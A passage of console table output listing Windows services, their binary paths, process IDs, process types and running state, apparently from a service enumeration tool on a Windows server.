                    | CscService                               | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | DcomLaunch                               | C:\Windows\system32\svchost.exe -k DcomLaunch -p                                         |         764 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | defragsvc                                | C:\Windows\system32\svchost.exe -k defragsvc                                             |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | DeviceAssociationService                 | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | DeviceInstall                            | C:\Windows\system32\svchost.exe -k DcomLaunch -p                                         |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | DevQueryBroker                           | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Dhcp                                     | C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p                      |         788 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | diagnosticshub.standardcollector.service | C:\Windows\system32\DiagSvcs\DiagnosticsHub.StandardCollector.Service.exe                |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | DiagTrack                                | C:\Windows\System32\svchost.exe -k utcsvc -p                                             |        1324 | Own Process   | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | DispBrokerDesktopSvc                     | C:\Windows\system32\svchost.exe -k LocalService -p                                       |         892 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | DmEnrollmentSvc                          | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | dmwappushservice                         | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Dnscache                                 | C:\Windows\system32\svchost.exe -k NetworkService -p                                     |        1100 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | DoSvc                                    | C:\Windows\System32\svchost.exe -k NetworkService -p                                     |        4476 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | dot3svc                                  | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | DPS                                      | C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p                              |        1380 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | DsmSvc                                   | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | DsSvc                                    | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                       |         496 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | EapHost                                  | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | edgeupdate                               | "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc               |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | edgeupdatem                              | "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc            |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | EFS                                      | C:\Windows\System32\lsass.exe                                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | embeddedmode                             | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | EntAppSvc                                | C:\Windows\system32\svchost.exe -k appmodel -p                                           |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | EventLog                                 | C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p                      |         788 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | EventSystem                              | C:\Windows\system32\svchost.exe -k LocalService -p                                       |         892 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | fdPHost                                  | C:\Windows\system32\svchost.exe -k LocalService -p                                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | FDResPub                                 | C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p                     |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | FontCache                                | C:\Windows\system32\svchost.exe -k LocalService -p                                       |         892 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | FrameServer                              | C:\Windows\System32\svchost.exe -k Camera                                                |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | FrameServerMonitor                       | C:\Windows\System32\svchost.exe -k CameraMonitor                                         |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | gpsvc                                    | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | GraphicsPerfSvc                          | C:\Windows\System32\svchost.exe -k GraphicsPerfSvcGroup                                  |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | hidserv                                  | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | HvHost                                   | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | IISADMIN                                 | C:\Windows\system32\inetsrv\inetinfo.exe                                                 |        2088 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | IKEEXT                                   | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | InstallService                           | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | iphlpsvc                                 | C:\Windows\System32\svchost.exe -k NetSvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | KeyIso                                   | C:\Windows\system32\lsass.exe                                                            |         656 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | KPSSVC                                   | C:\Windows\system32\svchost.exe -k KpsSvcGroup                                           |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | KtmRm                                    | C:\Windows\System32\svchost.exe -k NetworkServiceAndNoImpersonation -p                   |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | LanmanServer                             | C:\Windows\System32\svchost.exe -k smbsvcs                                               |        2144 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | LanmanWorkstation                        | C:\Windows\System32\svchost.exe -k NetworkService -p                                     |        1100 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | lfsvc                                    | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | LicenseManager                           | C:\Windows\System32\svchost.exe -k LocalService -p                                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | lltdsvc                                  | C:\Windows\System32\svchost.exe -k LocalService -p                                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | lmhosts                                  | C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p                      |         788 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | lpasvc                                   | "C:\Program Files\Microsoft Policy Platform\policyHost.exe" /service                     |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | lppsvc                                   | "C:\Program Files\Microsoft Policy Platform\policyHost.exe" /service                     |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | LSM                                      | C:\Windows\system32\svchost.exe -k DcomLaunch -p                                         |         764 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | MapsBroker                               | C:\Windows\System32\svchost.exe -k NetworkService -p                                     |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | McpManagementService                     | C:\Windows\system32\svchost.exe -k McpManagementServiceGroup                             |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | MicrosoftEdgeElevationService            | "C:\Program Files (x86)\Microsoft\Edge\Application\121.0.2277.106\elevation_service.exe" |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | mpssvc                                   | C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p                      |        1252 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | MSDTC                                    | C:\Windows\System32\msdtc.exe                                                            |        3348 | Own Process   | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | MSiSCSI                                  | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | msiserver                                | C:\Windows\system32\msiexec.exe /V                                                       |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | NcaSvc                                   | C:\Windows\System32\svchost.exe -k NetSvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | NcbService                               | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                       |         496 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Netlogon                                 | C:\Windows\system32\lsass.exe                                                            |         656 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Netman                                   | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | netprofm                                 | C:\Windows\System32\svchost.exe -k LocalService -p                                       |         892 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | NetSetupSvc                              | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | NetTcpPortSharing                        | C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | NgcCtnrSvc                               | C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p                      |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | NgcSvc                                   | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | NlaSvc                                   | C:\Windows\System32\svchost.exe -k NetworkService -p                                     |        1100 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | nsi                                      | C:\Windows\system32\svchost.exe -k LocalService -p                                       |         892 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | PcaSvc                                   | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |         496 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | PerfHost                                 | C:\Windows\SysWow64\perfhost.exe                                                         |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | pla                                      | C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p                              |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | PlugPlay                                 | C:\Windows\system32\svchost.exe -k DcomLaunch -p                                         |         764 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | PolicyAgent                              | C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted -p                    |        1908 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Power                                    | C:\Windows\system32\svchost.exe -k DcomLaunch -p                                         |         764 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | PrintNotify                              | C:\Windows\system32\svchost.exe -k print                                                 |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | ProfSvc                                  | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | PushToInstall                            | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | QWAVE                                    | C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p                     |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | RasAuto                                  | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | RasMan                                   | C:\Windows\System32\svchost.exe -k netsvcs                                               |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | RemoteAccess                             | C:\Windows\System32\svchost.exe -k netsvcs                                               |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | RemoteRegistry                           | C:\Windows\system32\svchost.exe -k localService -p                                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | RmSvc                                    | C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted                         |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | RpcEptMapper                             | C:\Windows\system32\svchost.exe -k RPCSS -p                                              |         880 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | RpcLocator                               | C:\Windows\system32\locator.exe                                                          |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | RpcSs                                    | C:\Windows\system32\svchost.exe -k rpcss -p                                              |         880 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | RSoPProv                                 | C:\Windows\system32\RSoPProv.exe                                                         |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | sacsvr                                   | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SamSs                                    | C:\Windows\system32\lsass.exe                                                            |         656 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SCardSvr                                 | C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation                        |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | ScDeviceEnum                             | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                          |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Schedule                                 | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SCPolicySvc                              | C:\Windows\system32\svchost.exe -k netsvcs                                               |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | seclogon                                 | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SecurityHealthService                    | C:\Windows\system32\SecurityHealthService.exe                                            |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SEMgrSvc                                 | C:\Windows\system32\svchost.exe -k LocalService -p                                       |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SENS                                     | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Sense                                    | "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"               |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SensorDataService                        | C:\Windows\System32\SensorDataService.exe                                                |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SensorService                            | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SensrSvc                                 | C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p                     |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SessionEnv                               | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SgrmBroker                               | C:\Windows\system32\SgrmBroker.exe                                                       |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SharedAccess                             | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | ShellHWDetection                         | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | shpamsvc                                 | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | smphost                                  | C:\Windows\System32\svchost.exe -k smphost                                               |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | smstsmgr                                 | C:\Windows\CCM\TSManager.exe /service                                                    |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SNMPTRAP                                 | C:\Windows\System32\snmptrap.exe                                                         |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Spooler                                  | C:\Windows\System32\spoolsv.exe                                                          |        2000 | Own Process   | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | sppsvc                                   | C:\Windows\system32\sppsvc.exe                                                           |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SSDPSRV                                  | C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p                     |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | ssh-agent                                | C:\Windows\System32\OpenSSH\ssh-agent.exe                                                |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SstpSvc                                  | C:\Windows\system32\svchost.exe -k LocalService -p                                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | StateRepository                          | C:\Windows\system32\svchost.exe -k appmodel -p                                           |         924 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | StiSvc                                   | C:\Windows\system32\svchost.exe -k imgsvc                                                |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | StorSvc                                  | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                       |         496 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | svsvc                                    | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | swprv                                    | C:\Windows\System32\svchost.exe -k swprv                                                 |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SysMain                                  | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |         496 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | SystemEventsBroker                       | C:\Windows\system32\svchost.exe -k DcomLaunch -p                                         |         764 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | TabletInputService                       | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | tapisrv                                  | C:\Windows\System32\svchost.exe -k NetworkService -p                                     |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | TermService                              | C:\Windows\System32\svchost.exe -k termsvcs                                              |         264 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Themes                                   | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | TieringEngineService                     | C:\Windows\system32\TieringEngineService.exe                                             |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | TimeBrokerSvc                            | C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p                      |         788 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | TokenBroker                              | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | TrkWks                                   | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                       |         496 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | TrustedInstaller                         | C:\Windows\servicing\TrustedInstaller.exe                                                |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | tzautoupdate                             | C:\Windows\system32\svchost.exe -k LocalService -p                                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | UALSVC                                   | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |         496 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | UevAgentService                          | C:\Windows\system32\AgentService.exe                                                     |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | UmRdpService                             | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                       |         496 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | upnphost                                 | C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p                     |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | UserManager                              | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | UsoSvc                                   | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | VaultSvc                                 | C:\Windows\system32\lsass.exe                                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
